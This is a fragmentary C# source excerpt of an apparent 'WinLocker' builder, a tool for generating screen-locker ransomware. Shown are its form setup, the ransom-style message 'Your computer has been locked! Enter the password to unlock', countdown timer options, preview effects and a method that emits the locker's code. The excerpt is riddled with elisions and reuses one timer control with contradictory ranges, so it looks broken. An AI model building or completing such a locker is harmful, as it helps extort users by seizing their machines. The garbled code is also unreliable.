...
namespace WinLockerBuilder
{
    public partial class Form1 : Form
    {
        ...
        private NumericUpDown numTimerSeconds;
        ...
        private TabPage CreateMainTab()
        {
            ...
            txtMessage = CreateRichTextBox("Your computer has been locked!\n\nEnter the password to unlock.", "");
            ...
            numTimerSeconds = new NumericUpDown();
            numTimerSeconds.Minimum = 10;
            numTimerSeconds.Maximum = 3600;
            numTimerSeconds.Value = 60;
            numTimerSeconds.BackColor = Color.FromArgb(30, 30, 50);
            numTimerSeconds.ForeColor = Color.White;
            numTimerSeconds.Font = new Font("Segoe UI", 10);
            numTimerSeconds.Width = 80;
            timerPanel.Controls.Add(numTimerSeconds);
        ...
        private TabPage CreateTimerTab()
        {
            ...
            numTimerSeconds = new NumericUpDown();
            numTimerSeconds.Minimum = 0;
            numTimerSeconds.Maximum = 59;
            numTimerSeconds.Value = 0;
            numTimerSeconds.BackColor = Color.FromArgb(30, 30, 50);
            numTimerSeconds.ForeColor = Color.White;
            numTimerSeconds.Font = new Font("Segoe UI", 10);
            numTimerSeconds.Width = 60;
            timePanel.Controls.Add(numTimerSeconds);
        ...
        private RichTextBox CreateRichTextBox(string text, string placeholder)
        {
        ...
        {
            // Пустая, т.к. тема задается вручную
        }
            ...
            try
            {
                ...
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    ...
                    if (cbBackgroundStyle.SelectedItem?.ToString() == "Matrix")
                    {
                        for (int i = 0; i < 30; i++)
                        {
                            int x = new Random().Next(w);
                            int y = new Random().Next(h);
                    ...
                    // Подзаголовок
                    string msg = "Your system has been locked";
                    ...
                    if (chkPulsingButton.Checked)
                    {
                        int pulse = (int)(Math.Sin(DateTime.Now.Millisecond / 1000.0 * Math.PI * 2) * 5);
                    ...
                    if (chkShowTimer.Checked)
                    {
                        ...
                        string timeStr = "⏱ 00:" + ((int)numTimerSeconds.Value).ToString("D2");
        ...
        private string GenerateWinLockerCode()
        {
            ...
            int timerSeconds = (int)numTimerSeconds.Value;
            ...
            int seconds = (int)numTimerSeconds.Value;
            ...
            code.AppendLine("            {");
            code.AppendLine("                // Matrix effect handled in Paint");
            ...
            code.AppendLine("");
            code.AppendLine("            // Поле ввода пароля");
